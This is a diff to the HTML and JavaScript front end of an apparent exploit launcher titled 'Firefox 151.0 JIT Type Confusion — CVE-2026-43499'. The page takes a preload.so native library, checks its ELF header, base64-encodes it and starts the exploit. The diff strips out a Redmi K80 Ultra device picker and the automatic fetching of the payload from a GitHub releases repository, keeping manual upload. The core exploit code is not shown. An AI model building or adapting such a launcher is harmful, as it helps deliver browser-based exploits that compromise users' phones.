@@ -349,26 +349,13 @@ body {
     <div class="subtitle">Firefox 151.0 JIT Type Confusion &mdash; CVE-2026-43499</div>
   </div>
 
-  <!-- Step 1: Device Select -->
-  <div id="step-device" class="card">
-    <div class="card-header">选择目标设备</div>
-    <div id="device-chips" class="chip-group"></div>
-    <div id="device-info" style="font-size:12px;color:var(--md-sys-color-outline);min-height:18px"></div>
-  </div>
-
-  <!-- Step 2: Load preload.so -->
-  <div id="step-load" class="card hidden">
+  <!-- Load preload.so -->
+  <div id="step-load" class="card">
     <div class="card-header">加载 preload.so</div>
-    <div id="auto-status" class="status-row hidden">
-      <div class="spinner"></div>
-      <span>正在从 GitHub 获取最新构建...</span>
-    </div>
-    <div id="auto-result" class="hidden"></div>
-    <div class="divider"></div>
     <div id="file-drop" class="file-drop">
       <input type="file" id="file-input" accept=".so">
       <div class="icon">&#128194;</div>
-      <div class="label">手动选择 preload.so</div>
+      <div class="label">选择 preload.so 文件</div>
       <div class="hint">支持拖拽或点击选择文件</div>
     </div>
     <button id="btn-start" class="btn btn-filled btn-full hidden" disabled>
@@ -405,17 +392,11 @@ body {
 <div id="snackbar" class="snackbar"></div>
 
 <script>
-const GITHUB_API = 'https://api.github.com/repos/bmbxwbh/RootmeKit/releases';
 const MAX_ATTEMPTS = 3;
 const ATTEMPT_TIMEOUT_MS = 8000;
 const RUN_ID = Date.now().toString(36) + Math.random().toString(36).slice(2);
 
-const DEVICES = [
-  { id: 'prague', name: 'Redmi K80 Ultra', codename: 'prague', keywords: ['prague', 'k90max', 'k80ultra'] },
-];
-
 let preloadDataBase64 = null;
-let selectedDevice = null;
 let done = false;
 let attempt = 0;
 let timer = 0;
@@ -425,7 +406,6 @@ let startTs = 0;
 let elapsedTimer = 0;
 
 const $ = (s) => document.getElementById(s);
-const stepDevice = $('step-device');
 const stepLoad = $('step-load');
 const stepExploit = $('step-exploit');
 const stepResult = $('step-result');
@@ -440,93 +420,7 @@ function snack(msg) {
   setTimeout(() => el.classList.remove('show'), 3000);
 }
 
-// ─── Device selector ─────────────────────────────────────────────────────────
-function buildDeviceChips() {
-  const group = $('device-chips');
-  DEVICES.forEach(dev => {
-    const chip = document.createElement('button');
-    chip.className = 'chip';
-    chip.innerHTML = '<span class="dot"></span>' + dev.name;
-    chip.addEventListener('click', () => {
-      group.querySelectorAll('.chip').forEach(c => c.classList.remove('selected'));
-      chip.classList.add('selected');
-      selectedDevice = dev;
-      $('device-info').textContent = 'codename: ' + dev.codename;
-      show(stepLoad);
-      fetchLatestSo(dev);
-    });
-    group.appendChild(chip);
-  });
-}
-
-// ─── Fetch latest preload.so from GitHub Releases ─────────────────────────────
-async function fetchLatestSo(device) {
-  const statusEl = $('auto-status');
-  const resultEl = $('auto-result');
-  show(statusEl);
-  hide(resultEl);
-
-  try {
-    const resp = await fetch(GITHUB_API + '?per_page=20');
-    if (!resp.ok) throw new Error('API ' + resp.status);
-    const releases = await resp.json();
-
-    let found = null;
-    for (const rel of releases) {
-      if (!rel.assets || rel.assets.length === 0) continue;
-      const body = (rel.body || '').toLowerCase();
-      const name = (rel.name || '').toLowerCase();
-      const tag = (rel.tag_name || '').toLowerCase();
-      const haystack = body + ' ' + name + ' ' + tag;
-      if (device.keywords.some(kw => haystack.includes(kw))) {
-        const soAsset = rel.assets.find(a => a.name === 'preload.so');
-        if (soAsset) {
-          found = { release: rel, asset: soAsset };
-          break;
-        }
-      }
-    }
-
-    hide(statusEl);
-    if (found) {
-      const rel = found.release;
-      const asset = found.asset;
-      resultEl.innerHTML =
-        '<div class="status-row">' +
-        '<span class="status-chip success">LATEST</span>' +
-        '<span>' + (rel.tag_name || '') + ' &mdash; ' + (asset.size / 1024).toFixed(1) + ' KB</span>' +
-        '</div>';
-      show(resultEl);
-
-      const dlResp = await fetch(asset.browser_download_url);
-      if (!dlResp.ok) throw new Error('Download ' + dlResp.status);
-      const buf = await dlResp.arrayBuffer();
-      const data = new Uint8Array(buf);
-      if (data[0] !== 0x7f || data[1] !== 0x45 || data[2] !== 0x4c || data[3] !== 0x46) {
-        throw new Error('不是有效的 ELF 文件');
-      }
-      let binary = '';
-      for (let i = 0; i < data.length; i++) binary += String.fromCharCode(data[i]);
-      preloadDataBase64 = btoa(binary);
-      resultEl.innerHTML +=
-        '<div style="font-size:12px;color:#A6E3A1;margin-top:4px">自动获取成功 (' + data.length + ' bytes)</div>';
-      show($('btn-start'));
-      $('btn-start').disabled = false;
-      $('file-drop').querySelector('.label').textContent = '或手动选择其他文件';
-    } else {
-      resultEl.innerHTML =
-        '<div style="font-size:12px;color:var(--md-sys-color-outline)">未找到匹配的构建，请手动上传</div>';
-      show(resultEl);
-    }
-  } catch (e) {
-    hide(statusEl);
-    resultEl.innerHTML =
-      '<div style="font-size:12px;color:var(--md-sys-color-error)">获取失败: ' + e.message + '，请手动上传</div>';
-    show(resultEl);
-  }
-}
-
-// ─── File upload (manual fallback) ────────────────────────────────────────────
+// ─── File upload ──────────────────────────────────────────────────────────────
 $('file-input').addEventListener('change', function() {
   handleFile(this.files[0]);
 });
@@ -567,7 +461,6 @@ $('btn-start').addEventListener('click', startExploit);
 
 function startExploit() {
   if (!preloadDataBase64) { snack('请先加载 preload.so'); return; }
-  hide(stepDevice);
   hide(stepLoad);
   show(stepExploit);
   keepScreenAwake();
@@ -722,7 +615,7 @@ function downloadLog() {
 }
 
 // ─── Init ────────────────────────────────────────────────────────────────────
-buildDeviceChips();
+// Ready
 </script>
 </body>
 </html>
